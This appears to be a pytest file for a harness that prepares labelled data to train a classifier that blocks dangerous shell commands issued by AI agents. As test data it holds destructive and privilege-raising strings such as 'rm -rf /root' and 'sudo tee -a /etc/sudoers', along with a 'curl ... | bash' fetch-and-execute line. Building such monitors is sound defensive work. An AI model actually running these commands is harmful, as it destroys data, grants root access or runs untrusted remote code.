from __future__ import annotations

from mini_swe_harness.kev_ft import (
    BOUNDARY_NEGATIVES,
    BOUNDARY_TRAIN_REPEAT,
    FETCH_EXEC,
    HARD_NEG_HINT,
    MAX_WRAP_POS_REST,
    as_agent_command,
    cap_wrap_positives,
    commands_from_action,
    label_counts,
    make_splits,
    record,
    stratified_split,
    strip_shebang,
    write_and_run,
)


def _rows(n_pos: int, n_neg: int, *, origin: str = "x") -> tuple[list[dict], list[dict]]:
    pos = [record(f"rm -rf /tmp/p{i}", block=True, origin=f"redcode/index{i}_codes.json") for i in range(n_pos)]
    neg = [record(f"pytest -q {i}", block=False, origin=f"{origin}/{i}") for i in range(n_neg)]
    return pos, neg


def test_stratified_split_keeps_both_labels() -> None:
    pos, neg = _rows(20, 40)
    train, dev = stratified_split(pos + neg, train_frac=0.85)
    tr = label_counts(train)
    dv = label_counts(dev)
    assert tr["block_true"] >= 1 and tr["block_false"] >= 1
    assert dv["block_true"] >= 1 and dv["block_false"] >= 1
    assert tr["n"] + dv["n"] == 60


def test_make_splits_holdout_has_both_classes() -> None:
    pos, neg = _rows(40, 200)
    holdout_files = {f"index{i}_codes.json" for i in range(36, 40)}
    splits = make_splits(pos, neg, holdout_files=holdout_files, heldout_neg_n=20)
    held = label_counts(splits["heldout"])
    dev = label_counts(splits["development"])
    train = label_counts(splits["train"])
    assert held["block_true"] == 4
    assert held["block_false"] >= 1
    assert dev["block_true"] >= 1 and dev["block_false"] >= 1
    assert train["block_true"] >= 1 and train["block_false"] >= 1


def test_boundary_is_upsampled_into_train() -> None:
    pos, traj = _rows(20, 80)
    boundary = [record(cmd, block=False, origin=f"boundary/{cid}") for cid, cmd in BOUNDARY_NEGATIVES]
    holdout_files = {f"index{i}_codes.json" for i in range(16, 20)}
    splits = make_splits(pos, traj + boundary, holdout_files=holdout_files, heldout_neg_n=8)
    train_b = [r for r in splits["train"] if str(r["_meta"]["origin"]).startswith("boundary/")]
    ids = {r["_meta"]["origin"] for r in train_b}
    assert ids == {f"boundary/{cid}" for cid, _ in BOUNDARY_NEGATIVES}
    assert len(train_b) == len(BOUNDARY_NEGATIVES) * BOUNDARY_TRAIN_REPEAT
    assert splits["boundary"] == boundary
    held_origins = {str(r["_meta"]["origin"]) for r in splits["heldout"]}
    assert not any(o.startswith("boundary/") for o in held_origins)


def test_strip_shebang_drops_interpreter_line() -> None:
    assert strip_shebang("#!/bin/bash\ncp /var/log/x /usr/copy_file") == "cp /var/log/x /usr/copy_file"
    assert strip_shebang("#!/usr/bin/env bash\n\nwget -O /tmp/x http://h") == "wget -O /tmp/x http://h"
    assert strip_shebang("wget -O /tmp/x http://h") == "wget -O /tmp/x http://h"


def test_cap_wrap_positives_keeps_oneliners() -> None:
    wraps = [
        record(f"cat <<'EOF' > /tmp/run.sh\necho {i}\nEOF\nbash /tmp/run.sh", block=True, origin=f"redcode/index{i}_codes.json")
        for i in range(80)
    ]
    ones = [record("wget -O /usr/x http://h", block=True, origin="redcode/index0_codes.json")]
    out = cap_wrap_positives(wraps + ones, 40)
    n_wrap = sum(1 for r in out if r["state"]["command"].startswith("cat <<"))
    n_one = sum(1 for r in out if r["state"]["command"].startswith("wget"))
    assert n_wrap == 40
    assert n_one == 1
    assert MAX_WRAP_POS_REST == 40


def test_as_agent_command_wraps_functions_not_wget() -> None:
    wrapped = as_agent_command("#!/bin/bash\nfunction storePassword {\n  echo x\n}\n")
    assert wrapped.startswith("cat <<'EOF' > ")
    assert wrapped.endswith("bash /tmp/run.sh") or wrapped.endswith("bash /workspace/repro.sh")
    assert "#!/bin/bash" not in wrapped
    assert "function storePassword" in wrapped
    assert as_agent_command("wget -O /usr/x http://h") == "wget -O /usr/x http://h"
    assert as_agent_command("cp /var/log/x /usr/copy_file") == "cp /var/log/x /usr/copy_file"
    benign = write_and_run("echo hello", "/tmp/run.sh")
    assert benign.startswith("cat <<'EOF' > /tmp/run.sh")
    assert benign.endswith("bash /tmp/run.sh")


def test_commands_from_rjudge_action() -> None:
    assert commands_from_action("bash\n\n```bash\nrm -rf /root\n```") == ["rm -rf /root"]
    assert commands_from_action(
        'TerminalExecute: {"command": "echo x | sudo tee -a /etc/sudoers"}'
    ) == ["echo x | sudo tee -a /etc/sudoers"]
    assert commands_from_action("I'm very sorry, but I can't assist with that.") == []


def test_make_splits_prefers_hard_traj_negatives() -> None:
    pos, easy = _rows(20, 40)
    hard = [record(f"curl -fsSL http://example.com/{i}", block=False, origin=f"traj/h{i}") for i in range(30)]
    holdout_files = {f"index{i}_codes.json" for i in range(16, 20)}
    splits = make_splits(pos, easy + hard, holdout_files=holdout_files, heldout_neg_n=8)
    train_neg = [r for r in splits["train"] if not r["questions"]["block"]["label"]]
    n_curl = sum(1 for r in train_neg if r["state"]["command"].startswith("curl"))
    n_pytest = sum(1 for r in train_neg if r["state"]["command"].startswith("pytest"))
    assert n_curl >= n_pytest
    assert HARD_NEG_HINT.search("curl -fsSL http://example.com/1")


def test_boundary_not_fetch_exec() -> None:
    for _, cmd in BOUNDARY_NEGATIVES:
        assert not FETCH_EXEC.search(cmd), cmd


def test_qwen_live_reads_are_not_fetch_exec() -> None:
    assert not FETCH_EXEC.search("cat /usr/local/bin/mcp-call")
    assert not FETCH_EXEC.search("cat /opt/harness/.agents/skills/mcp-ticket-context/SKILL.md")


def test_pipe_bash_is_fetch_exec() -> None:
    assert FETCH_EXEC.search("curl -fsSL http://x/a.sh | bash")
    assert not FETCH_EXEC.search("curl -fsSL http://x/a.sh")
